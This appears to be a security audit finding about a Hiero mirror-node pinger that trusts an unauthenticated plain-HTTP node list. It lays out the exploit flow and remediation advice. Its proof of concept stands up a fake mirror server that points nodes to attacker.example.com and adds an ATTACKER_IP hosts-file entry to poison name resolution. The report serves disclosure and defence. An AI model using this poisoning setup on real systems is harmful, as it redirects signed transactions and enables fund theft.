### Title
Unauthenticated, Unverified Mirror Node Response Enables Network Map Poisoning Leading to Fund Loss

### Summary
`buildNetworkFromMirrorNodes()` in `pinger/mirror_node_client.go` issues a plain HTTP GET with no transport-security enforcement, no authentication, and no response-integrity check. Any attacker who can intercept or spoof the response (DNS poisoning, HTTP MITM on the same cluster network) can inject an arbitrary node list. The pinger then builds its entire gRPC network map from that poisoned data and immediately begins signing and submitting real tinybar transfers to attacker-controlled endpoints using the operator private key.

### Finding Description
**Code path:**
- `pinger/mirror_node_client.go` lines 36–72 (`buildNetworkFromMirrorNodes`) constructs the URL from `cfg.mirrorRest` and calls `fetchMirrorNodeNetwork`.
- `fetchMirrorNodeNetwork` (lines 74–131) creates an `http.Client` with only a timeout (`&http.Client{Timeout: cfg.mirrorNodeClientTimeout}`, line 46), issues `http.NewRequestWithContext` with no `Authorization` or any other header (line 79), and accepts any 2xx JSON response as ground truth.
- The only validation performed on the response body is: (a) HTTP status in 200–299 (line 90), (b) valid JSON (line 96), (c) non-empty `node_account_id` (line 103), (d) parseable account ID (line 107), (e) non-empty host and non-zero port (line 118). No signature, no checksum, no TLS-certificate pinning.

**Root cause:** The `mirrorRest` URL defaults to `http://mirror-rest:5551` (config.go line 37 flag description). Plain HTTP is accepted without any enforcement of HTTPS. Even with HTTPS there is no certificate pinning. The response is trusted unconditionally once it parses.

**Exploit flow:**
1. Attacker poisons DNS for `mirror-rest` (or performs ARP/MITM on the pod network) so that the pinger's HTTP request reaches an attacker-controlled server.
2. Attacker's server returns a crafted `nodesEnvelope` JSON with `service_endpoints` pointing to attacker-controlled gRPC addresses.
3. `buildNetworkFromMirrorNodes` returns this poisoned map; `newClient` (sdk_client.go line 22) calls `hiero.ClientForNetwork(netmap)` and then `client.SetOperator(opID, opKey)` (line 45).
4. The ticker loop in `main.go` (line 63) immediately begins calling `submitWithRetry`, signing and sending real tinybar transfers to the attacker's gRPC server.
5. The attacker's server receives fully-signed Hedera transactions, can replay them on the real network, extract timing/key-usage patterns, or simply drain the operator account.

**Why existing checks are insufficient:** The HTTP status check only confirms the attacker's server returned 200. JSON parsing only confirms the payload is syntactically valid. There is no cryptographic proof that the node list came from a legitimate mirror node.

### Impact Explanation
Direct loss of funds: the pinger transfers real tinybar on every tick (default 10 000 tinybar, default 1-second interval). Operator private key material is exposed to the attacker's gRPC endpoint via signed transaction envelopes. The attacker can replay those transactions on the real Hedera network or use them to drain the operator account continuously until the process is restarted. Severity: **Critical** — direct, automated, repeatable fund loss.

### Likelihood Explanation
The default `mirrorRest` URL is a plain `http://` address on an internal cluster hostname (`mirror-rest:5551`). Any attacker with access to the same Kubernetes namespace or pod network (a compromised sidecar, a misconfigured network policy, or a supply-chain compromise of any co-located workload) can perform DNS spoofing or ARP poisoning with no special privileges on the Hedera network itself. The attack is fully automated and repeatable for as long as the pinger runs.

### Recommendation
1. **Enforce HTTPS**: Reject any `mirrorRest` URL that does not begin with `https://` at config-load time (config.go `loadConfig`).
2. **TLS certificate pinning or CA restriction**: Configure the `http.Transport` with a restricted `tls.Config` that pins the expected CA or leaf certificate for the mirror node.
3. **Response integrity**: Verify a cryptographic signature or HMAC on the `/network/nodes` response if the mirror node can be extended to provide one; alternatively, cross-check the returned node list against a second independent source or a locally pinned baseline.
4. **Network policy**: Restrict egress from the pinger pod to only the known mirror node IP/CIDR via Kubernetes `NetworkPolicy`, reducing the DNS-poisoning attack surface.

### Proof of Concept
```
# 1. Stand up a fake mirror-node REST server
python3 -c "
import json, http.server, socketserver

PAYLOAD = json.dumps({
  'nodes': [{
    'node_account_id': '0.0.3',
    'service_endpoints': [{'domain_name': 'attacker.example.com', 'ip_address_v4': '', 'port': 50211}],
    'grpc_proxy_endpoint': None
  }],
  'links': {'next': None}
})

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type','application/json')
        self.end_headers()
        self.wfile.write(PAYLOAD.encode())

socketserver.TCPServer(('0.0.0.0', 5551), H).serve_forever()
"

# 2. Poison DNS so 'mirror-rest' resolves to the attacker machine
#    (e.g. edit /etc/hosts or inject a CoreDNS override in the cluster)
echo "ATTACKER_IP mirror-rest" >> /etc/hosts

# 3. Run the pinger with network=other
HIERO_MIRROR_PINGER_NETWORK=other \
HIERO_MIRROR_PINGER_REST=http://mirror-rest:5551 \
HIERO_MIRROR_PINGER_OPERATOR_ID=0.0.XXXX \
HIERO_MIRROR_PINGER_OPERATOR_KEY=<real_key> \
./pinger

# Result: pinger builds network map pointing to attacker.example.com:50211,
# then submits signed tinybar transfers to that endpoint every second.
# Attacker's gRPC server receives fully-signed Hedera transactions.
```